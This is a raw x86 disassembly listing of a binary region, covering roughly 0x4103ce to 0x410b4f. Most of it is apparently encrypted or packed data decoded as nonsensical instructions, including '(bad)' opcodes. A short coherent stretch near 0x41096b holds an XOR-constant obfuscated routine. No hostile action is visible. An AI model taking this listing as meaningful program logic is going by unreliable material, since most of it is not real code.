  4103ce:	dec    edi
  4103cf:	mov    eax,0xec78eb1c
  4103d4:	daa    
  4103d5:	cld    
  4103d6:	outs   dx,BYTE PTR ds:[esi]
  4103d7:	bound  edi,QWORD PTR [eax]
  4103d9:	and    eax,0x9352aae8
  4103de:	xchg   edi,eax
  4103df:	pusha  
  4103e0:	lock pop ebp
  4103e2:	clc    
  4103e3:	cmp    esp,DWORD PTR [ebx+eiz*8+0x36]
  4103e7:	mov    edi,0x2cce2272
  4103ec:	sar    esp,1
  4103ee:	cmp    dh,BYTE PTR [eax+0x56f0fdf4]
  4103f4:	xchg   edx,eax
  4103f5:	mov    ebx,0x7880fb27
  4103fa:	ret    
  4103fb:	cmp    al,0xbd
  4103fd:	aaa    
  4103fe:	(bad)  
  4103ff:	mov    ch,dl
  410401:	dec    ecx
  410402:	shl    BYTE PTR ds:[ecx-0x3f],cl
  410406:	or     al,0xbb
  410408:	arpl   si,cx
  41040a:	xchg   ebp,eax
  41040b:	mov    ch,0xb9
  41040d:	and    DWORD PTR [eax+0x36],0x1a
  410411:	imul   esp,eax,0xdc56db25
  410417:	inc    esi
  410418:	fwait
  410419:	std    
  41041a:	fbstp  TBYTE PTR [ecx-0x48]
  41041d:	fs and ebx,0x691a283a
  410424:	dec    edi
  410425:	sbb    ebx,DWORD PTR [edx]
  410427:	sahf   
  410428:	retf   
  410429:	cli    
  41042a:	cmp    al,0xa0
  41042c:	mov    cl,0x89
  41042e:	adc    DWORD PTR ds:0x47690762,ebp
  410434:	jb     0x4103df
  410436:	daa    
  410437:	das    
  410438:	(bad)  
  410439:	mov    ecx,0x540ca27a
  41043e:	fst    DWORD PTR [edx]
  410440:	sbb    dl,BYTE PTR [edi]
  410442:	int3   
  410443:	loopne 0x41042e
  410445:	adc    ch,ch
  410447:	mov    ch,0x31
  410449:	(bad)  
  41044a:	xlat   BYTE PTR ds:[ebx]
  41044b:	inc    ebp
  41044c:	sti    
  41044d:	fisubr DWORD PTR [ecx-0x5323d4fc]
  410453:	xchg   edi,eax
  410454:	sub    ch,BYTE PTR [ebx+0x102b2ab]
  41045a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41045b:	xor    ah,dl
  41045d:	aaa    
  41045e:	jno    0x4103e6
  410460:	add    eax,0x7d3654eb
  410465:	or     DWORD PTR [esi-0x1e],edx
  410468:	pop    edx
  410469:	xlat   BYTE PTR ds:[ebx]
  41046a:	xchg   esp,eax
  41046b:	int3   
  41046c:	xor    DWORD PTR [ebx],esp
  41046e:	fistp  QWORD PTR [esi]
  410470:	or     al,0x93
  410472:	jge    0x410449
  410474:	xchg   edx,eax
  410475:	inc    edx
  410476:	rcl    dh,1
  410478:	popf   
  410479:	sbb    bl,BYTE PTR [edi+0x34]
  41047c:	dec    edx
  41047d:	mov    esi,edx
  41047f:	jno    0x4104d5
  410481:	mov    edi,0x1d8646b
  410486:	aaa    
  410487:	cmp    eax,0x3c
  41048a:	mov    ch,BYTE PTR [edx-0x5f146b7d]
  410490:	push   ds
  410491:	dec    esi
  410492:	test   DWORD PTR [eax],ecx
  410494:	xchg   edi,eax
  410495:	cwde   
  410496:	cld    
  410497:	inc    edx
  410498:	cs nop
  41049a:	pop    esp
  41049b:	call   0x3deb93c8
  4104a0:	iret   
  4104a1:	pop    esi
  4104a2:	push   es
  4104a3:	jge    0x4104a4
  4104a5:	ins    DWORD PTR es:[edi],dx
  4104a6:	lahf   
  4104a7:	outs   dx,DWORD PTR ds:[esi]
  4104a8:	cmp    BYTE PTR [edi-0x7466d22c],ah
  4104ae:	mov    ecx,0xfa93076c
  4104b3:	sbb    DWORD PTR [ecx-0x627c1892],0xd
  4104ba:	adc    eax,0x7ecf5ed5
  4104bf:	adc    ah,bh
  4104c1:	fisub  DWORD PTR [eax+0x67]
  4104c4:	idiv   BYTE PTR [ecx]
  4104c6:	pop    es
  4104c7:	cmp    bh,BYTE PTR [ecx+0x28]
  4104ca:	(bad)  
  4104cb:	(bad)  
  4104cd:	sbb    al,al
  4104cf:	aas    
  4104d0:	ins    BYTE PTR es:[edi],dx
  4104d1:	loope  0x410476
  4104d3:	stos   BYTE PTR es:[edi],al
  4104d4:	or     eax,0xf3247368
  4104d9:	xchg   esp,eax
  4104da:	out    dx,eax
  4104db:	inc    ebx
  4104dc:	push   esp
  4104dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104de:	sbb    BYTE PTR [ecx],ah
  4104e0:	in     al,0x2c
  4104e2:	sahf   
  4104e3:	ins    BYTE PTR es:[edi],dx
  4104e4:	fmul   st(4),st
  4104e6:	pop    edi
  4104e7:	mov    ds,WORD PTR es:[edi+0x65040c87]
  4104ee:	push   cs
  4104ef:	enter  0xb732,0xd0
  4104f3:	mov    al,ds:0x1c602fea
  4104f8:	jbe    0x41056f
  4104fa:	xchg   ebp,eax
  4104fb:	mov    bl,0xc3
  4104fd:	stc    
  4104fe:	xchg   esp,eax
  4104ff:	xor    al,0xef
  410501:	std    
  410502:	scas   eax,DWORD PTR es:[edi]
  410503:	push   es
  410504:	cmp    al,BYTE PTR [eax+0x1102ce0b]
  41050a:	xlat   BYTE PTR ds:[ebx]
  41050b:	ror    BYTE PTR [ebp-0x4073104b],cl
  410511:	mov    ebp,0xabdf66fe
  410516:	push   ebp
  410517:	lods   eax,DWORD PTR ds:[esi]
  410518:	mov    bl,0xfb
  41051a:	xchg   ebx,eax
  41051b:	add    bl,0x96
  41051e:	inc    ebx
  41051f:	jnp    0x4104eb
  410521:	xor    eax,DWORD PTR [ecx-0x60]
  410524:	add    al,0x75
  410526:	push   ds
  410527:	jnp    0x4104c3
  410529:	push   ebx
  41052a:	adc    DWORD PTR [eax+eax*1-0x69],ebp
  41052e:	and    BYTE PTR ds:0xf4b2feef,cl
  410534:	ss jg  0x4104e3
  410537:	and    dh,ah
  410539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41053a:	push   ebx
  41053b:	data16 mov ch,0xc5
  41053e:	mov    esp,0x5b3d36d7
  410543:	cdq    
  410544:	iret   
  410545:	cmc    
  410546:	imul   edi,DWORD PTR ds:[eax],0x147eb47e
  41054d:	mov    ebp,0x6535e76b
  410552:	ret    
  410553:	cli    
  410554:	ins    DWORD PTR es:[edi],dx
  410555:	dec    eax
  410556:	jo     0x4104da
  410558:	stos   DWORD PTR es:[edi],eax
  410559:	cmp    BYTE PTR [esi],bh
  41055b:	sub    eax,0x3d378d11
  410560:	div    dh
  410562:	sub    ah,BYTE PTR [edx-0x7b24fe6e]
  410568:	pusha  
  410569:	lahf   
  41056a:	mov    eax,0xfc085db
  41056f:	test   BYTE PTR [esi-0x76ffffec],cl
  410575:	jne    0x410553
  410577:	jmp    0x41096b
  41057c:	in     eax,0xe6
  41057e:	outs   dx,DWORD PTR ds:[esi]
  41057f:	pop    ebp
  410580:	outs   dx,DWORD PTR ds:[esi]
  410581:	jne    0x410578
  410583:	data16 hlt 
  410585:	test   ebx,eax
  410587:	pushf  
  410588:	jecxz  0x410599
  41058a:	ja     0x410564
  41058c:	or     bh,BYTE PTR [edi+0x7d497070]
  410592:	jo     0x410604
  410594:	xor    DWORD PTR [eax-0x59],esp
  410597:	mov    eax,ds:0x8a9beedf
  41059c:	pushf  
  41059d:	es daa 
  41059f:	xor    al,0x3b
  4105a1:	jae    0x41060a
  4105a3:	ins    DWORD PTR es:[edi],dx
  4105a4:	inc    edi
  4105a5:	cmp    esp,DWORD PTR [ebp+0x4f]
  4105a8:	push   edi
  4105a9:	mov    DWORD PTR [edi+0x4401e693],esp
  4105af:	imul   eax,ecx,0xe9f43671
  4105b5:	and    dl,BYTE PTR [esi+0x76]
  4105b8:	mov    ch,0xd5
  4105ba:	mov    al,ds:0x2d160e12
  4105bf:	jmp    0x41063b
  4105c1:	sahf   
  4105c2:	cdq    
  4105c3:	imul   esi,DWORD PTR [ecx+0x45],0x330df713
  4105ca:	xchg   DWORD PTR [ecx-0x3dbf38eb],edi
  4105d0:	out    0x50,eax
  4105d2:	cdq    
  4105d3:	adc    DWORD PTR [eax+0x5b],edx
  4105d6:	mov    dh,BYTE PTR [ebp-0x71123f7e]
  4105dc:	jne    0x4105af
  4105de:	fsub   DWORD PTR [esi]
  4105e0:	adc    ecx,DWORD PTR [eax-0x213506bd]
  4105e6:	mov    al,ds:0xac60033d
  4105eb:	xchg   esi,eax
  4105ec:	xchg   esp,eax
  4105ed:	mov    edi,0xe17d865c
  4105f2:	mov    ds:0x8cf4f690,eax
  4105f7:	inc    ecx
  4105f8:	outs   dx,BYTE PTR ds:[esi]
  4105f9:	out    dx,eax
  4105fa:	xor    DWORD PTR fs:[esi-0x20467434],edx
  410601:	test   al,0x5d
  410603:	sbb    eax,DWORD PTR [esp+ebx*4+0x5e]
  410607:	(bad)  
  410608:	int3   
  410609:	xor    al,0xd
  41060b:	or     eax,0x3be19a9d
  410610:	shr    esp,cl
  410612:	dec    edx
  410613:	push   edi
  410614:	adc    ecx,DWORD PTR ds:[esi]
  410617:	iret   
  410618:	hlt    
  410619:	popa   
  41061a:	xchg   DWORD PTR [edx],edi
  41061c:	imul   esp,DWORD PTR [eax-0x13f3c05],0x7dc6eb03
  410626:	lods   eax,DWORD PTR ds:[esi]
  410627:	mov    edi,0x3219611
  41062c:	sub    al,0x25
  41062e:	push   eax
  41062f:	cmp    BYTE PTR [edi-0x3a407b0e],ch
  410635:	jo     0x410625
  410637:	mov    al,ds:0xab583b2d
  41063c:	push   edi
  41063d:	adc    al,0xb2
  41063f:	xchg   ebp,eax
  410640:	fwait
  410641:	pusha  
  410642:	xchg   ebp,eax
  410643:	data16 ins BYTE PTR es:[edi],dx
  410645:	adc    edi,DWORD PTR [edx]
  410647:	addr16 cmc 
  410649:	sbb    DWORD PTR [edi+0x12958b42],edx
  41064f:	fcom   QWORD PTR [ebx-0x58d72cb]
  410655:	adc    BYTE PTR [ebx],dl
  410657:	inc    esp
  410658:	imul   eax,DWORD PTR [ebp+0x4ad57779],0x5b
  41065f:	adc    esi,DWORD PTR [edx]
  410661:	xchg   BYTE PTR [edi],dl
  410663:	pop    ebx
  410665:	aas    
  410666:	(bad)  
  410667:	sbb    al,0xb8
  410669:	push   ecx
  41066a:	loope  0x410641
  41066c:	inc    ebx
  41066d:	gs or  edx,ebp
  410670:	mov    dh,0xc
  410672:	cdq    
  410673:	push   DWORD PTR [ebx]
  410675:	hlt    
  410676:	pop    edi
  410677:	outs   dx,BYTE PTR ds:[esi]
  410678:	cmp    eax,0xf281673
  41067d:	aam    0xfa
  41067f:	inc    esp
  410680:	cmp    DWORD PTR [edi-0x1f],0x21fd9c56
  410687:	pop    ecx
  410688:	ins    DWORD PTR es:[edi],dx
  410689:	sub    edi,DWORD PTR [edx-0xe10e37f]
  41068f:	fwait
  410690:	mov    ecx,0x6b5c0af
  410695:	ins    BYTE PTR es:[edi],dx
  410696:	dec    ecx
  410697:	jecxz  0x4106bb
  410699:	sub    ch,BYTE PTR [ecx-0x24348948]
  41069f:	scas   eax,DWORD PTR es:[edi]
  4106a0:	jne    0x410684
  4106a2:	cs or  dl,bl
  4106a5:	ins    DWORD PTR es:[edi],dx
  4106a6:	sbb    ebp,edi
  4106a8:	ja     0x410683
  4106aa:	inc    ebx
  4106ab:	and    esi,DWORD PTR ds:0x3868a949
  4106b1:	adc    BYTE PTR [ebx+0x3597a237],al
  4106b7:	int3   
  4106b8:	loopne 0x4106d3
  4106ba:	or     dh,BYTE PTR [ebx-0x689eb3a9]
  4106c0:	int3   
  4106c1:	lods   al,BYTE PTR ds:[esi]
  4106c2:	dec    esp
  4106c3:	mov    edi,0x46d693b8
  4106c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106c9:	mov    ?,WORD PTR [edi+0x4d]
  4106cc:	mov    dh,0x42
  4106ce:	ins    BYTE PTR es:[edi],dx
  4106cf:	dec    ebx
  4106d0:	shr    DWORD PTR ss:[ebp+0x1ffac3fb],1
  4106d7:	xor    eax,0xb4bbc1ae
  4106dc:	fwait
  4106dd:	pop    esp
  4106de:	jb     0x4106a4
  4106e0:	cmp    eax,0xd89694a3
  4106e5:	inc    ecx
  4106e6:	int3   
  4106e7:	leave  
  4106e8:	mul    BYTE PTR [edx]
  4106ea:	xchg   edi,eax
  4106eb:	test   DWORD PTR [edx+0x324f1de1],edx
  4106f1:	jnp    0x4106a2
  4106f3:	sub    BYTE PTR [edi-0x3abdf86f],bh
  4106f9:	bound  edx,QWORD PTR [eax+0x21]
  4106fc:	jno    0x410775
  4106fe:	mov    al,0xec
  410700:	jmp    0x58c70936
  410705:	bound  edx,QWORD PTR [ecx+ecx*1-0x6c]
  410709:	icebp  
  41070a:	xchg   esi,eax
  41070b:	in     al,0x61
  41070d:	sbb    BYTE PTR [edx-0x73aaf74a],bl
  410713:	pusha  
  410714:	mov    dl,0xf8
  410716:	and    DWORD PTR [esi],eax
  410718:	jbe    0x41075f
  41071a:	cld    
  41071b:	dec    edi
  41071c:	test   BYTE PTR [esi+0x2e4a1116],cl
  410722:	rcr    BYTE PTR [eax+0x3d3b0cd1],cl
  410728:	lea    esi,[ecx+eiz*8]
  41072b:	mov    edi,0x2dbaf526
  410730:	adc    DWORD PTR [ebx+eiz*2-0x1b],ebp
  410734:	pop    eax
  410735:	out    0x90,al
  410737:	das    
  410738:	mov    edi,0xdd1d44d1
  41073d:	ins    BYTE PTR es:[edi],dx
  41073e:	pop    ss
  41073f:	pop    edi
  410740:	leave  
  410741:	and    ch,bh
  410743:	shr    DWORD PTR ds:[eiz*4-0x7f26cad6],cl
  41074b:	and    eax,0x3e208794
  410750:	sub    BYTE PTR [edx],cl
  410752:	cmp    ebx,edi
  410754:	fcmovne st,st(0)
  410756:	loop   0x4107a2
  410758:	fadd   QWORD PTR [esi]
  41075a:	push   esi
  41075b:	retf   
  41075c:	aaa    
  41075d:	femms  
  41075f:	inc    edx
  410760:	jmp    0x48b41d3e
  410765:	push   eax
  410766:	add    DWORD PTR [ecx+0x19e9a63c],edx
  41076c:	sar    DWORD PTR [edx-0x6277e097],1
  410772:	or     edx,DWORD PTR [eax]
  410774:	sbb    al,0x45
  410776:	or     al,0x28
  410778:	hlt    
  410779:	push   cs
  41077a:	out    0xfd,eax
  41077c:	xchg   ecx,eax
  41077d:	ds jle 0x41076a
  410780:	adc    BYTE PTR [edx+0x1002cb0e],dl
  410786:	xchg   edi,eax
  410787:	rcl    BYTE PTR [ebx],0x78
  41078a:	into   
  41078b:	(bad)  
  41078c:	scas   al,BYTE PTR es:[edi]
  41078d:	leave  
  41078e:	add    ebp,DWORD PTR [edx-0x64]
  410791:	dec    esp
  410792:	mov    ch,0x7b
  410794:	jle    0x410753
  410796:	xchg   esi,eax
  410797:	mov    ss,esp
  410799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41079a:	imul   eax,DWORD PTR [eax+ecx*4-0x18fa6e8e],0x15
  4107a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107a3:	push   edi
  4107a4:	xchg   ebp,eax
  4107a5:	loope  0x4107d5
  4107a7:	cmp    ebx,DWORD PTR [eax]
  4107a9:	ror    BYTE PTR [ecx],0xee
  4107ac:	mov    ah,0xcb
  4107ae:	pop    ebp
  4107af:	sub    ch,BYTE PTR [edx+0x58]
  4107b2:	sub    eax,0x7f8a93a2
  4107b7:	ds clc 
  4107b9:	not    DWORD PTR [eax-0xd]
  4107bc:	adc    dl,ah
  4107be:	pop    ecx
  4107bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107c0:	sub    BYTE PTR [eax+ecx*1-0x1cf6b28a],0x3c
  4107c8:	das    
  4107c9:	repnz fcmovnbe st,st(4)
  4107cc:	push   esi
  4107cd:	test   eax,0x3478c32d
  4107d2:	pop    ecx
  4107d3:	cmc    
  4107d4:	out    0x59,eax
  4107d6:	add    al,0x51
  4107d8:	inc    edx
  4107d9:	and    DWORD PTR gs:[ebx+0x1e1e02d2],ebp
  4107e0:	xchg   esp,eax
  4107e1:	inc    eax
  4107e2:	addr16 adc al,0x7a
  4107e5:	inc    ecx
  4107e6:	outs   dx,DWORD PTR ds:[esi]
  4107e7:	fisttp QWORD PTR [ecx+0x22b2cbbd]
  4107ed:	cmp    edx,DWORD PTR [ebp-0x542dbb32]
  4107f3:	push   eax
  4107f4:	imul   esi,DWORD PTR [ebx+0x60],0x23668a28
  4107fb:	sti    
  4107fc:	or     DWORD PTR [ecx],ebx
  4107fe:	hlt    
  4107ff:	adc    DWORD PTR [eax],ebx
  410801:	sbb    al,0x3f
  410803:	dec    eax
  410804:	sub    edx,DWORD PTR [eax-0x3]
  410807:	out    0x5b,eax
  410809:	outs   dx,DWORD PTR ds:[esi]
  41080a:	jecxz  0x4107ea
  41080c:	imul   eax,DWORD PTR [esi+0x3aeb5249],0x5398f951
  410816:	inc    esi
  410817:	in     al,0x53
  410819:	push   es
  41081a:	mov    DWORD PTR [edi+edx*1+0x47b2b2b7],edx
  410821:	pusha  
  410822:	mov    DWORD PTR [ebx],edx
  410824:	gs mov ebx,0x3fb4f4fe
  41082a:	push   edi
  41082b:	jb     0x41084a
  41082d:	bound  esi,QWORD PTR [edi]
  41082f:	dec    ebx
  410830:	and    DWORD PTR [ebx+eiz*1],0xb7f0a8a7
  410837:	retf   
  410838:	sti    
  410839:	in     al,dx
  41083a:	into   
  41083b:	out    dx,eax
  41083c:	mov    ds:0x31069cf4,al
  410842:	xor    ebp,DWORD PTR [esi+0x3c]
  410845:	out    dx,eax
  410846:	call   DWORD PTR [ebp+0x4d]
  410849:	sbb    bl,BYTE PTR [edx+0x6c50fe1a]
  41084f:	xor    al,0x4f
  410851:	push   edx
  410852:	xor    DWORD PTR [ebp+0x59],esi
  410855:	push   edx
  410856:	shl    DWORD PTR [esi-0x74],cl
  410859:	ror    DWORD PTR [esi],0xec
  41085c:	repnz imul edx,ebx,0xfffffffb
  410860:	sbb    eax,DWORD PTR [edx-0x48dd7838]
  410866:	adc    esp,eax
  410868:	or     BYTE PTR [ebp-0x5eb2c8d9],0xf2
  41086f:	mul    BYTE PTR [eax-0x364e3874]
  410875:	mov    ch,0xcf
  410877:	ret    
  410878:	cld    
  410879:	inc    ebp
  41087a:	cmp    DWORD PTR ds:0xbdaab4d7,0x4d
  410881:	xor    esi,esp
  410883:	push   ebp
  410884:	(bad)  
  410885:	hlt    
  410886:	inc    ebp
  410887:	jns    0x41084c
  410889:	add    dh,bh
  41088b:	cmc    
  41088c:	loope  0x4108fc
  41088e:	cmp    al,0x4a
  410890:	mov    ebp,0x97f8376b
  410895:	mov    dh,BYTE PTR [eax-0x1f]
  410898:	rcr    BYTE PTR [esi-0x7d],1
  41089b:	cmp    BYTE PTR [eax+ebx*8-0x44e4cf94],0xd4
  4108a3:	jecxz  0x410883
  4108a5:	out    0x43,al
  4108a7:	sbb    bl,BYTE PTR [eax]
  4108a9:	sub    ebp,esi
  4108ab:	je     0x4108c7
  4108ad:	(bad)  [edx-0x4b]
  4108b0:	push   ss
  4108b1:	lods   eax,DWORD PTR ds:[esi]
  4108b2:	shl    BYTE PTR [esi-0x31],0x9d
  4108b6:	js     0x410917
  4108b8:	lds    edx,FWORD PTR [eax]
  4108ba:	test   eax,0xa348549d
  4108bf:	pop    edi
  4108c0:	leave  
  4108c1:	fadd   st,st(1)
  4108c3:	jmp    DWORD PTR [edi]
  4108c5:	mov    esi,0x8d37cfac
  4108ca:	daa    
  4108cb:	jbe    0x4108ef
  4108cd:	xor    DWORD PTR [esi+0x45a8085e],ebx
  4108d3:	and    edi,DWORD PTR [eax+0x2ac4c949]
  4108d9:	push   ds
  4108da:	adc    edi,DWORD PTR [esp+edi*2+0x40]
  4108de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108df:	sub    dl,0x78
  4108e2:	jno    0x410882
  4108e4:	sub    DWORD PTR [eax+0x310d7e98],esp
  4108ea:	sbb    ch,BYTE PTR [esi-0x42]
  4108ed:	repz arpl WORD PTR [ecx],si
  4108f0:	dec    edi
  4108f1:	loop   0x4108d0
  4108f3:	push   ebx
  4108f4:	sbb    al,BYTE PTR [eax-0x1e]
  4108f7:	(bad)  
  4108f8:	lods   eax,DWORD PTR ds:[esi]
  4108f9:	ds and eax,0x3647013e
  4108ff:	push   cs
  410900:	dec    edx
  410901:	std    
  410902:	adc    ch,BYTE PTR [edx+0x1e]
  410905:	shl    edi,1
  410907:	in     eax,0x7a
  410909:	lahf   
  41090a:	xlat   BYTE PTR ds:[ebx]
  41090b:	pop    eax
  41090c:	aad    0xca
  41090e:	xchg   esi,eax
  41090f:	jae    0x4108b7
  410911:	lods   al,BYTE PTR ds:[esi]
  410912:	mov    ah,BYTE PTR [edi-0x58]
  410915:	sbb    eax,0x1a84b77c
  41091a:	pop    ds
  41091b:	aas    
  41091c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41091d:	or     al,0xce
  41091f:	aad    0xf2
  410921:	iret   
  410922:	push   eax
  410923:	call   0xe84af796
  410928:	sub    DWORD PTR [edi-0x56],ebx
  41092b:	ins    BYTE PTR es:[edi],dx
  41092c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41092d:	stc    
  41092e:	dec    ebp
  41092f:	(bad)  
  410930:	fwait
  410931:	push   ecx
  410932:	test   DWORD PTR [ecx-0x340e1657],ebp
  410938:	jmp    0x41094c
  41093a:	lds    esp,FWORD PTR [edx+eax*1]
  41093d:	retf   0xd63f
  410940:	adc    BYTE PTR [esi-0x40],0x6d
  410944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410945:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  410947:	mov    eax,DWORD PTR [esi-0x57]
  41094a:	aad    0xab
  41094c:	xlat   BYTE PTR ds:[ebx]
  41094d:	inc    esi
  41094e:	in     al,0xa8
  410950:	or     esp,ecx
  410952:	icebp  
  410953:	fist   DWORD PTR [ecx+0x5138b7ec]
  410959:	aaa    
  41095a:	mov    ?,WORD PTR [eax+0x1410a15a]
  410960:	addr16 xchg esp,eax
  410962:	in     eax,dx
  410963:	dec    edi
  410964:	rcl    BYTE PTR [edx+0x6d],cl
  410967:	mov    dh,0x86
  410969:	mov    bh,0xe1
  41096b:	push   0xb
  41096d:	pop    ecx
  41096e:	push   0x5
  410970:	dec    ecx
  410971:	pop    ebx
  410972:	xchg   ebx,ecx
  410974:	sub    ebx,ecx
  410976:	xchg   ebx,ecx
  410978:	dec    ecx
  410979:	mov    eax,DWORD PTR [ebp-0x1c]
  41097c:	imul   eax,ecx
  41097f:	sub    esp,eax
  410981:	mov    DWORD PTR [ebp-0x24],esp
  410984:	mov    eax,DWORD PTR [ebp-0x4]
  410987:	mov    ecx,0x7510855
  41098c:	xor    eax,ecx
  41098e:	mov    edx,0x32729c
  410993:	add    eax,edx
  410995:	mov    DWORD PTR [ebp+0x8],eax
  410998:	mov    eax,DWORD PTR [ebp-0x18]
  41099b:	xor    eax,ecx
  41099d:	add    eax,edx
  41099f:	mov    edx,DWORD PTR [ebp+0x14]
  4109a2:	imul   eax,DWORD PTR [edx]
  4109a5:	mov    edx,DWORD PTR [ebp-0x4]
  4109a8:	xor    edx,ecx
  4109aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4109ad:	lea    ecx,[edx+ecx*1+0x32729c]
  4109b4:	cmp    ecx,eax
  4109b6:	je     0x4119fd
  4109bc:	mov    edi,DWORD PTR [ebp-0x18]
  4109bf:	mov    eax,DWORD PTR [ebp+0x8]
  4109c2:	mov    edx,DWORD PTR [ebp+0x14]
  4109c5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4109c9:	mov    ecx,0x7510855
  4109ce:	xor    edx,edx
  4109d0:	xor    edi,ecx
  4109d2:	mov    esi,0x32729c
  4109d7:	add    edi,esi
  4109d9:	div    edi
  4109db:	mov    edx,DWORD PTR [ebp-0x4]
  4109de:	xor    edx,ecx
  4109e0:	lea    eax,[edx+eax*1+0x32729c]
  4109e7:	mov    edx,DWORD PTR [ebp+0x8]
  4109ea:	mov    edi,DWORD PTR [ebp-0x24]
  4109ed:	mov    DWORD PTR [edi+edx*4],eax
  4109f0:	mov    eax,DWORD PTR [ebp-0x18]
  4109f3:	jmp    0x410de7
  4109f8:	ja     0x41099d
  4109fa:	mov    ecx,0x7175496f
  4109ff:	mov    ds:0xd6da6ce9,eax
  410a04:	pushf  
  410a05:	lahf   
  410a06:	(bad)  
  410a07:	pushf  
  410a08:	arpl   WORD PTR [eax+esi*2+0x707d4970],di
  410a0f:	jo     0x410a3a
  410a11:	mov    ds:0x46f2bb14,al
  410a16:	cs cwde 
  410a18:	add    al,0x73
  410a1a:	sti    
  410a1b:	xchg   esi,eax
  410a1c:	fadd   DWORD PTR [eax-0x76]
  410a1f:	scas   eax,DWORD PTR es:[edi]
  410a20:	adc    al,0xd8
  410a22:	sub    eax,0x70cba452
  410a27:	jmp    0x410a92
  410a29:	cmp    al,dl
  410a2b:	or     eax,0x59da9179
  410a30:	and    al,0x4d
  410a32:	dec    ebp
  410a33:	pop    esi
  410a34:	mov    ebp,0xa5f27f8e
  410a39:	mov    al,ds:0xb9d270ae
  410a3e:	cmp    esi,esi
  410a40:	inc    edi
  410a41:	dec    edi
  410a42:	xor    bh,BYTE PTR [ecx+0x6d5bbd6b]
  410a48:	xchg   edi,eax
  410a49:	test   BYTE PTR [ebx-0x29dbb166],bl
  410a4f:	cmp    bh,BYTE PTR [edx+0x3a]
  410a52:	jnp    0x4109ee
  410a54:	lods   eax,DWORD PTR ds:[esi]
  410a55:	jle    0x410ab3
  410a57:	fcmovnbe st,st(3)
  410a59:	xor    al,dh
  410a5b:	mov    eax,ds:0x259b43be
  410a60:	in     eax,0xd2
  410a62:	push   ebp
  410a63:	xor    cl,BYTE PTR [eax]
  410a65:	scas   eax,DWORD PTR es:[edi]
  410a66:	cs push 0x29
  410a69:	lock xchg edx,eax
  410a6b:	ss jl  0x410ace
  410a6e:	outs   dx,DWORD PTR ds:[esi]
  410a6f:	imul   edx,DWORD PTR [ecx],0x371cc0a3
  410a75:	shl    edx,0x29
  410a78:	test   DWORD PTR [eax-0x330f9f7e],esp
  410a7e:	jae    0x410add
  410a80:	or     al,0xbc
  410a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a83:	fcomp  QWORD PTR [ebp+0x36576b99]
  410a89:	add    eax,0x2314f979
  410a8e:	stos   DWORD PTR es:[edi],eax
  410a8f:	jb     0x410a73
  410a91:	pop    eax
  410a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a93:	(bad)  
  410a95:	mov    ecx,0xe00c0c20
  410a9a:	leave  
  410a9b:	in     eax,0xc
  410a9d:	push   cs
  410a9e:	push   ds
  410a9f:	repnz pushf 
  410aa1:	xlat   BYTE PTR ds:[ebx]
  410aa2:	icebp  
  410aa3:	pusha  
  410aa4:	cdq    
  410aa5:	jg     0x410aa5
  410aa7:	xor    bl,BYTE PTR [esi-0x63]
  410aaa:	inc    ebp
  410aab:	sar    BYTE PTR [ecx+0x35712338],1
  410ab1:	repz enter 0x7d9f,0x57
  410ab6:	and    esp,eax
  410ab8:	mov    cl,0xdd
  410aba:	retf   0xeef8
  410abd:	and    DWORD PTR [ebp-0x42],edx
  410ac0:	pop    ss
  410ac1:	dec    edi
  410ac2:	test   BYTE PTR [ecx+0x4237491d],ch
  410ac8:	jle    0x410b48
  410aca:	mov    al,0x9f
  410acc:	inc    ecx
  410acd:	jno    0x410b06
  410acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad0:	mov    dh,0x40
  410ad2:	icebp  
  410ad3:	xchg   edi,eax
  410ad4:	pop    ecx
  410ad5:	inc    DWORD PTR [ebx+0x73]
  410ad8:	out    dx,al
  410ad9:	mov    BYTE PTR [eax],bl
  410adb:	and    DWORD PTR [ecx+0x11],ebx
  410ade:	jbe    0x410afe
  410ae0:	jbe    0x410b0d
  410ae2:	call   0x2b73:0x9552fc9d
  410ae9:	js     0x410b54
  410aeb:	jg     0x410b31
  410aed:	(bad)  
  410aee:	(bad)  
  410aef:	iret   
  410af0:	pop    ebx
  410af1:	xchg   BYTE PTR [ebp+0x38],dh
  410af4:	push   ss
  410af5:	adc    BYTE PTR [esi+0x4c],dl
  410af8:	push   ss
  410af9:	aam    0x8
  410afb:	mov    ebx,0x3647a21b
  410b00:	out    dx,al
  410b01:	push   0x1f
  410b03:	sub    esp,DWORD PTR [eax]
  410b05:	mov    ah,0xda
  410b07:	mov    ds:0x5ab0d660,eax
  410b0c:	push   es
  410b0d:	pusha  
  410b0e:	mov    edx,0x6e66af93
  410b13:	mov    dl,0x88
  410b15:	int    0x31
  410b17:	fucom  st(4)
  410b19:	stc    
  410b1a:	push   ebp
  410b1b:	jbe    0x410b47
  410b1d:	daa    
  410b1e:	and    ch,dh
  410b20:	mov    ds:0x2a12feb1,al
  410b25:	sbb    esp,edi
  410b27:	sbb    eax,ecx
  410b29:	repnz sbb al,0x79
  410b2c:	ret    0x1f1f
  410b2f:	pop    esp
  410b30:	or     dh,BYTE PTR [edx]
  410b32:	mov    dh,0x10
  410b34:	jae    0x410b87
  410b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b37:	stos   DWORD PTR es:[edi],eax
  410b38:	sub    DWORD PTR [ebx-0x43f45b2d],ecx
  410b3e:	outs   dx,DWORD PTR ds:[esi]
  410b3f:	mov    bh,0xf
  410b41:	jle    0x410b3c
  410b43:	jp     0x410bb1
  410b45:	sahf   
  410b46:	mov    esi,0x1f884310
  410b4b:	jbe    0x410acf
  410b4d:	aaa    
  410b4e:	aas    
  410b4f:	cmp    al,0xc4
